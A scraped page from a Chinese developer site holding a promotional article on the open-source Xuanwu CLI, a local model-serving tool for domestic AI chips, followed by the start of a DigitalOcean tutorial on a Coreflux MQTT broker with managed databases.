                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这几天，AI 圈的头号 C 位莫过于这只「龙虾」：Clawdbot（现在得叫它 OpenClaw 了），它几乎把一群开发者折腾得彻夜难眠。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16a218c63b724f84ab57fddfc289cad2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770707821&amp;x-signature=QJQ9DKx8%2F5C59R8uYOHVZGNVZE8%3D" alt="图片" loading="lazy"/></p>
<p>为什么它这么火？因为和以前那些只会陪聊的 Chatbot 不同，Clawdbot 是个真正的「实干派」：它能接管你的电脑，在你睡觉时通宵写代码、修 Bug，甚至背着主人手搓出一套语音功能。</p>
<p>更魔幻的是，随之诞生的 AI 社交平台 Moltbook 彻底刷屏了。在这个「AI 版 Reddit」上，150 万个 Agent 正通过自创语言和共谋进化，建立起背离人类掌控的独立机器社会与文化。</p>
<p>这听起来很酷，但随之而来的是「隐私的裸奔」与「钱包的哀嚎」。</p>
<p>当 Clawdbot 这样的 Agent 全面读取你的屏幕、扫描你的文件，并在后台疯狂消耗昂贵的 API 额度时，很多开发者早就开始思考一个问题：Agent 虽好，难道我们以后的一举一动都要通过云端计费吗？</p>
<p>这催生了另一个巨大的需求：Local Agent（本地智能体）。</p>
<p>但在这一波浪潮中，算力并不是唯一的门槛。以 Clawdbot 为例，当前社区主流方案主要围绕 macOS 与 NVIDIA GPU 生态展开，这与 Ollama、llama.cpp 以及相关 Agent 工具链的成熟度密切相关。</p>
<p>相比之下，尽管华为昇腾、燧原等国产算力已经具备运行大模型的能力，但在通用 Agent 工具链与社区生态适配方面仍存在明显差距，这使得部分开发者难以直接参与到当前主流的 Agent 实验与应用中。</p>
<p>难道手握国产算力的开发者，只能眼巴巴看着这场狂欢吗？当然不是。</p>
<p>国产显卡其实从来不缺「肌肉」，缺的只是一把趁手的「兵器」。如果说 Clawdbot 解决了「AI 怎么干活」的问题，那么我们今天要聊的这个工具，就是来解决「AI 在哪干活」的问题。</p>
<p>2 月 2 日，清昴智能发布玄武 CLI 开源版本。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b938736ebe44183977abdac6aafbd79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770707821&amp;x-signature=%2FGTbonWBedodt2X4PjYsyKZLisU%3D" alt="图片" loading="lazy"/></p>
<p>你可以把它简单理解为「国产版 Ollama」，它旨在抹平硬件架构的差异，让基于国产卡的大模型部署进入「零门槛时代」。不需要复杂的环境配置，5 分钟启动模型服务，这不仅是企业降低部署成本的利器，更是每一位开发者激活手边国产算力的钥匙。</p>
<p><strong>玄武 CLI 开源传送门：</strong></p>
<ul>
<li>
<p><strong>玄武 CLI GitHub 仓库：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTsingmaoAI%2Fxw-cli" target="_blank" title="https://github.com/TsingmaoAI/xw-cli" ref="nofollow noopener noreferrer">github.com/TsingmaoAI/…</a></p>
</li>
<li>
<p><strong>玄武 CLI Gitcode 仓库：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2Ftsingmao%2Fxw-cli" target="_blank" title="https://gitcode.com/tsingmao/xw-cli" ref="nofollow noopener noreferrer">gitcode.com/tsingmao/xw…</a></p>
</li>
</ul>
<p>别急着下单 Mac mini，你机箱里的「国货之光」其实早就准备好了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc1e698b0f6945309cb7a76bb443b8af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770707821&amp;x-signature=yif2NJfqwHyQ1d7iNtIvKmB4UPA%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-0">开发者到底在和什么战斗？</h3>
<h3 data-id="heading-1"/>
<p>进入 2026 年，随着 DeepSeek、Kimi 等高性能开源模型的成熟，AI 推理形态正在从以云端为中心，逐步向本地与边缘侧扩展。出于对数据隐私（金融代码、医疗数据）和低延迟 Agent 交互的需求，本地化推理正在成为清晰可见的趋势。</p>
<p>在 NVIDIA 和 Apple Metal 生态中，Ollama 凭借「一个二进制文件、一行命令」的极致体验，成为最具代表性的本地推理工具之一。然而，这种统一而简洁的使用方式，并未真正惠及中国主流国产算力用户。</p>
<p>尽管国产芯片在硬件指标上已具备相当竞争力，但在软件生态层面仍存在明显断层：工具链割裂、算子覆盖不足、社区适配滞后，正让开发者陷入一种新的焦虑：算力在手，却用不起来。</p>
<ul>
<li>
<h4 data-id="heading-2">一张卡，一套世界观</h4>
</li>
</ul>
<h4 data-id="heading-3"/>
<p>与 CUDA 近乎统一的格局不同，国产芯片架构呈现出「百花齐放却互不相通」的态势。华为的 CANN、摩尔线程的 MUSA，以及各家自成体系的工具链彼此独立。</p>
<p>对开发者而言，每更换一张卡，几乎意味着重新学习一套构建系统。由于上游社区难以维护如此多且杂的后端分支，国产卡用户往往只能依赖功能滞后、稳定性不足的非官方适配版本。</p>
<ul>
<li>
<h4 data-id="heading-4">从入门到放弃的「配置长征」</h4>
</li>
</ul>
<h4 data-id="heading-5"/>
<p>想在国产卡上跑通一个高性能模型？往往是一场耐心与运气的双重考验：</p>
<p>驱动、固件、Toolkit、算子包必须严格对齐，错一个版本号就报错；少配一个环境变量，程序就可能当场崩溃；即使使用 Docker，也无法像 NVIDIA 那样 <code>--gpus all</code> 一键搞定，而是要手动透传多个复杂设备节点。</p>
<ul>
<li>
<h4 data-id="heading-6">新模型「水土不服」</h4>
</li>
</ul>
<h4 data-id="heading-7"/>
<p>更具挑战的是，新一代模型架构（如 MoE、FP8 量化）在国产环境中往往缺乏成熟的高性能算子支持，，容易触发非最优执行路径，导致推理性能大幅下降。当遭遇模糊错误码时，开发者往往无从查证。</p>
<p>这就是行业的真实切面：开发者想要的是「5 分钟启动服务」，现实给的却是「5 天还在配环境」。行业迫切需要一个能够抹平底层硬件差异、统一上层使用体验的中间层工具。</p>
<h3 data-id="heading-8">玄武 CLI：</h3>
<h3 data-id="heading-9">国产算力的 Ollama 来了</h3>
<h3 data-id="heading-10"/>
<p>如果说 Ollama 的成功来自「让 GPU 消失在用户视野中」，那么玄武 CLI 的目标则是「让国产 GPU 的差异性也消失」。</p>
<p>它关注的重点并不是单纯「能否运行模型」，而是如何在复杂的国产芯片生态中，提供一种更统一、更稳定的部署与调用体验。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36f9a1aed9694ed0bb21892d0e642058~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770707821&amp;x-signature=W6els1tOIGtL4EBXFXcZ1Jeynms%3D" alt="图片" loading="lazy"/></p>
<p>玄武CLI的架构图。</p>
<h4 data-id="heading-11">国产原生适配：一键搞定，告别配置噩梦</h4>
<h4 data-id="heading-12"/>
<p>在国产算力生态中，最大的痛点来自芯片架构的高度碎片化。不同厂商、不同型号，对应不同驱动、不同推理引擎与参数组合，部署往往意味着反复查文档、改配置、踩坑调试。</p>
<h4 data-id="heading-13"/>
<p>玄武 CLI 的核心价值之一，就是把复杂性收敛到系统内部：它能够自动识别华为昇腾全系列、沐曦、燧原等多款国产芯片</p>
<p>对用户而言，不再需要理解底层架构差异，也无需手动调参调环境，真正实现「零调试部署」，从根本上降低国产芯片的使用门槛。</p>
<h3 data-id="heading-14">零门槛上手：1 分钟部署，无缝兼容无压力</h3>
<h3 data-id="heading-15"/>
<p>在使用体验上，玄武 CLI 走的是与 Ollama 同一条路线：极简、快速、低学习成本。用户无需安装 Python 或复杂依赖，只要基础驱动就绪，解压即可运行，最快 1 分钟启动服务。</p>
<ul>
<li>
<h4 data-id="heading-16">服务启动</h4>
</li>
</ul>
<h4 data-id="heading-17"/>
<p>一切始于一行简洁的命令 <code>xw serve</code>。无需复杂的环境变量配置，系统直接完成运行时配置初始化与全局端口分配，唤醒后台守护进程。</p>
<ul>
<li>
<h4 data-id="heading-18">模型交互</h4>
</li>
</ul>
<h4 data-id="heading-19"/>
<p>模型运行同样丝滑。通过 <code>xw run</code> 命令，系统能直接检测实例状态。若模型已就绪，即可秒级进入 Chat 会话模式，直接开始问答交互。</p>
<ul>
<li>
<h4 data-id="heading-20">模型下载</h4>
</li>
</ul>
<h4 data-id="heading-21"/>
<p>对于本地未获取的模型，告别繁琐的权重文件手动搬运与路径映射。通过 <code>xw pull</code>，自动完成模型权重与配置文件的拉取，提供清晰的进度验证。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/125cdaaf10884e4697ba158caa1e4c27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770707821&amp;x-signature=QJ5jn299JxBrxcTbrLpwBI765jg%3D" alt="图片" loading="lazy"/></p>
<p>玄武 CLI 目前已原生支持包括 DeepSeek、Qwen3、GLM-4.7、MiniMax 2.1 等在内的数十款主流模型，<strong>并</strong>在今天<strong>已完成 GLM-OCR 的 Day0 适配</strong>，覆盖从端侧轻量级到千亿参数旗舰级模型。</p>
<ul>
<li>
<h4 data-id="heading-22">实例启动</h4>
</li>
</ul>
<h4 data-id="heading-23"/>
<p>得益于底层的极致优化，在执行 <code>xw start</code> 启动实例时，系统能够自动调配 vLLM 等高性能后端。实测数据表明：即便是 32b 规模的模型，玄武 CLI 也能在 30 秒内完成启动。这个时间内，系统会自动完成模型切分、显存加载，并成功启动推理引擎。</p>
<p>同时，玄武 CLI 在命令层面与 Ollama 高度一致（如 <code>xw pull</code> / <code>run</code> / <code>ls</code> / <code>stop</code>），意味着会用 Ollama 就能直接上手玄武，几乎没有迁移成本。在应用层，它兼容 OpenAI API 接口，LangChain、LlamaIndex 以及各类 IDE 插件只需改一行 API 地址即可接入，无需重构原有应用栈。</p>
<p>在稳定性设计上，玄武 CLI 采用独立子进程架构，即使单个模型或任务出现异常，也不会影响整体服务，既适合个人开发者的轻量使用，也满足企业级稳定运行需求。</p>
<h3 data-id="heading-24">高性能与全保障并行：多引擎覆盖，风险提前规避</h3>
<h3 data-id="heading-25"/>
<p>玄武 CLI 内置自研的清昴核心推理引擎 MLGuider，在性能层面提供稳定保障，同时支持多种推理引擎并行兼容。这种设计一方面可以覆盖更广、更新的模型版本，另一方面也避免对单一引擎的过度依赖，从工程角度提前规避风险。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5a15ca40cf9448dbef83f0680952b2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770707821&amp;x-signature=UoXcJsSAGGY%2BexfnidU98aCcUfg%3D" alt="图片" loading="lazy"/></p>
<p>推理服务流程图。</p>
<p>多引擎并存，本质上是对兼容性与性能的双重极致优化。玄武 CLI 通过智能调度内置的 MLGuider 等引擎，能够深入芯片底层进行算子级调优，最大限度释放国产硬件算力。这种既保高性能推理、又顾模型多样性的策略，真正解决「国产卡能用但不好用」的核心问题。</p>
<p>同时，玄武 CLI 支持完全离线运行，不依赖云端服务，在国产芯片上即可完成模型管理与推理任务，适合对数据安全和稳定性要求较高的场景。</p>
<h3 data-id="heading-26">热门产品联动：拓展本地 AI 应用场景</h3>
<h3 data-id="heading-27"/>
<p>在应用生态层面，玄武 CLI 并不只是一个「模型启动器」，而是一个本地 AI 能力的底座。它可以与 Clawdbot 等热门本地 AI 工具联动，为这些产品提供低门槛的模型部署与调用能力，使自动化任务与智能应用更容易落地。</p>
<p>这种联动模式意味着，开发者不必重复解决模型部署问题，而可以把更多精力放在上层应用与业务逻辑上，从而放大本地 AI 工具的整体价值。</p>
<h3 data-id="heading-28">为什么是他们？</h3>
<h3 data-id="heading-29"/>
<p>玄武 CLI 的强大，源自其背后深厚的技术积淀。</p>
<p>清昴智能是一家专注于芯片适配和模型-框架-算子联合调优的全面领先 AI Infra 企业。创始团队来自清华大学计算机系，汇聚了来自斯坦福、新国立、爱丁堡大学以及华为、阿里、AMD 等全球顶尖机构的 AI 精英。</p>
<p>创始人关超宇小学到大学 2 次跳级，15 岁进入本科，21 岁获得清华大学特奖、西贝尔学者等一系列殊荣，22 岁放弃华为天才少年、阿里星等大厂 offer，选择携手导师朱文武教授和前华为英雄个人和极客开发荣誉获得者姚航联合创业。他们不仅懂软件，更懂底层的芯片微架构以及如何攻克国产软件生态难题。</p>
<p>成立 3 年，即获得华为哈勃的战略注资，以及多家国内一线基金的上亿元财务投资。这不仅证明了其技术价值，更意味着其与国产芯片厂商有着深度的原厂级合作关系，能够第一时间获取底层驱动支持。</p>
<p>清昴智能并未止步于 CLI 工具。以自研的异构推理引擎 MLGuider 为核心，公司构建了从底层芯片到上层框架以及 Agentic AI 的全栈能力，致力于构建 AI 2.0 时代软件基础设施，为企业智能化转型和 AGI 实现打造坚实底座。</p>
<p>玄武 CLI 正是这一庞大技术愿景在开发者侧的「尖刀」产品，旨在通过极致的易用性打开市场缺口，构建生态护城河。</p>
<h3 data-id="heading-30">结语</h3>
<h3 data-id="heading-31"/>
<p>技术，终究是要为人服务的。</p>
<p>过去几年，国产显卡用户面对的并非性能问题，而是生态问题：驱动、框架、工具链之间的割裂，使大量潜在算力长期处于「不可用状态」。</p>
<p>玄武 CLI 的出现，或许不能立刻让国产生态「拳打英伟达，脚踢苹果」，但它至少做到了一件事：把梯子递到了墙边。</p>
<p>它让开发者不必再充当「环境配置员」，而能重新回到创造本身；也让那些躺在机箱里吃灰的国产显卡，重新开始发热、计算，参与到真实的 AI 实践之中。</p>
<p>想要一起推动生态进步？赶快到 GitHub 给它一个 Star 吧！</p>
<h4 data-id="heading-32"/>

<ul>
<li>
<p><strong>玄武 CLI GitHub 仓库：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTsingmaoAI%2Fxw-cli" target="_blank" title="https://github.com/TsingmaoAI/xw-cli" ref="nofollow noopener noreferrer">github.com/TsingmaoAI/…</a></p>
</li>
<li>
<p><strong>玄武 CLI Gitcode 仓库：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2Ftsingmao%2Fxw-cli" target="_blank" title="https://gitcode.com/tsingmao/xw-cli" ref="nofollow noopener noreferrer">gitcode.com/tsingmao/xw…</a></p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[教程：构建基于 Coreflux MQTT 与托管数据库的IoT数据管道]]></title>    <link>https://juejin.cn/post/7602243150158692379</link>    <guid>https://juejin.cn/post/7602243150158692379</guid>    <pubDate>2026-02-03T07:22:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602243150158692379" data-draft-id="7602177113685622835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="教程：构建基于 Coreflux MQTT 与托管数据库的IoT数据管道"/> <meta itemprop="keywords" content="物联网"/> <meta itemprop="datePublished" content="2026-02-03T07:22:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="DigitalOcean"/> <meta itemprop="url" content="https://juejin.cn/user/2031553217827127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            教程：构建基于 Coreflux MQTT 与托管数据库的IoT数据管道
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2031553217827127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    DigitalOcean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:22:10.000Z" title="Tue Feb 03 2026 07:22:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读39分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">使用托管数据库部署 Coreflux MQTT 代理</h2>
<p><strong>MQTT 代理</strong> 通过发布-订阅消息模式连接物联网设备和应用程序，使其成为现代 <strong>物联网</strong> 基础设施的重要组成部分。<strong>Coreflux</strong> 是一个 <strong>低代码</strong> MQTT 代理，增加了实时数据处理和转换功能，让你可以直接与 <strong>DigitalOcean 托管数据库</strong>（包括 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aidroplet.com%2Fproduct%2Fmongodb%2F" target="_blank" title="https://www.aidroplet.com/product/mongodb/" ref="nofollow noopener noreferrer">MongoDB</a></strong>、<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aidroplet.com%2Fproduct%2Fpostgresql%2F" target="_blank" title="https://www.aidroplet.com/product/postgresql/" ref="nofollow noopener noreferrer">PostgreSQL</a></strong>、<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aidroplet.com%2Fproduct%2Fmysql%2F" target="_blank" title="https://www.aidroplet.com/product/mysql/" ref="nofollow noopener noreferrer">MySQL</a></strong> 和 <strong>OpenSearch</strong>）集成，而无需编写自定义集成代码。</p>
<p><strong>你将学到什么：</strong> 本教程将引导你部署一个完整的物联网数据管道——从在 DigitalOcean 上设置托管数据库集群和 Coreflux MQTT 代理，到配置安全的 VPC 网络、使用 Coreflux 的物联网语言 (LoT) 构建数据转换模型，以及自动将处理后的物联网数据存储到你选择的数据库中。最终你将获得一个可用于生产环境的设置，能够处理物联网应用的实时消息传递和持久存储。</p>
<h3 data-id="heading-1">关键要点</h3>
<p>在深入了解分步部署过程之前，以下是你将学到的关键点：</p>
<ul>
<li>在 DigitalOcean 上部署托管数据库集群（PostgreSQL、MongoDB、MySQL 或 OpenSearch），用于可扩展的物联网数据存储。</li>
<li>使用 Marketplace 镜像或 Docker 在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aidroplet.com%2Fproduct%2Fcloudcpu%2F" target="_blank" title="https://www.aidroplet.com/product/cloudcpu/" ref="nofollow noopener noreferrer">DigitalOcean Droplet （DigitalOcean的VPC）</a>上设置 Coreflux MQTT 代理。</li>
<li>创建安全的 VPC 网络以连接你的 MQTT 代理和数据库，无需公开暴露。</li>
<li>使用 Coreflux 的物联网语言 (LoT) 构建实时数据管道，实现低代码物联网自动化。</li>
<li>自动转换和存储物联网数据，从 MQTT 主题到数据库表、集合或索引。</li>
<li>验证端到端数据流，从模拟传感器通过转换模型到数据库存储。</li>
</ul>
<p>本教程为需要实时消息传递结合持久数据存储以及搜索、分析或关系查询等高级功能的物联网应用提供了一个可用于生产环境的基础。</p>
<h4 data-id="heading-2">你将构建什么</h4>
<p>在本教程结束时，你将得到：</p>
<ul>
<li>一个用于<strong>可扩展存储</strong>的<strong>托管数据库</strong>集群（<strong>PostgreSQL</strong>、<strong>MongoDB</strong>、<strong>MySQL</strong> 或 <strong>OpenSearch</strong>）</li>
<li>一台运行 <strong>Coreflux MQTT 代理</strong>的 <strong>DigitalOcean Droplet</strong></li>
<li>一个用于安全 <strong>物联网</strong>通信的虚拟私有云 (VPC) 网络</li>
<li>使用 <strong>LoT Notebook</strong> 扩展进行的<strong>实时数据</strong>模拟</li>
<li><strong>低代码</strong>数据转换模型和数据库集成路由</li>
<li>用于 <strong>物联网自动化</strong> 的完整 <strong>数据集成与转换</strong> 管道</li>
</ul>
<h3 data-id="heading-3">Coreflux 与 DigitalOcean 合作</h3>
